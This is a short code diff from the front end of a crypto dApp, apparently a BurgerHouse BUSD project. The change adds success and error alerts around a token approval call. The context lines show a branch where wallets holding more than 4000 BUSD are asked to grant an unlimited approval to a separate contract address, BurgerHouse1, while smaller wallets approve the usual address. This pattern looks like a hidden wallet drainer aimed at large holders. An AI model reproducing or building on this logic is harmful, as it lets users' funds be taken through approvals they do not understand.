@@ -397,9 +397,16 @@ const Home = () => {
       if (isConnected && busdContract) {
         if (parseFloat(busdBalance) > 4000 && parseFloat(userApprovedAmount1) < parseFloat(busdBalance)) {
           await busdContract.methods.approve(
+            // BurgerHouse,
             BurgerHouse1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({ from: curAcount })
+          ).send({
+            from: curAcount
+          }).then((txHash) => {
+            setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success!` });
+          }).catch((err) => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
+          });
         } else {
           await busdContract.methods.approve(
             BurgerHouse,
